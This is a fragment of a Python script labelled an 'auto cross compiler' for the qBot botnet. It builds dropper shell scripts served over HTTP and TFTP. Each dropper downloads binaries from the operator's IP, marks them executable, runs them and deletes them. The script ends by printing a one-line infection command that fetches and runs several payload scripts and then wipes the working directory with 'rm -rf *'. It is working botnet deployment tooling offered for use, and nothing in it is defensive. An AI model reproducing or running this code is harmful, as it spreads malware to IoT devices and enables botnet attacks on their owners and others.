#Python auto cross compiler by yung caesar
...
run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1337.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1337.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1337.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1227.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1227.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1227.sh')

run('echo -e "#!/bin/bash" > /var/www/html/bigdong.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bigdong.sh')
    ...
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1337.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1227.sh')

run("service xinetd restart")
run("service httpd restart")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[0;32mSuccessfully cross compiled qBot\x1b[0m")
print("\x1b[0;32mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bigdong.sh; chmod 777 bigdong.sh; sh bigdong.sh; tftp " + ip + " -c get tftp1337.sh; chmod 777 tftp1337.sh; sh tftp1337.sh; tftp -r tftp1227.sh -g " + ip + "; chmod 777 tftp1227.sh; sh tftp1227.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bigdong.sh tftp1337.sh tftp1227.sh ftp1.sh; rm -rf *\x1b[0m")
print
print("\x1b[0;32mInstagram @XboxModShop\x1b[0m")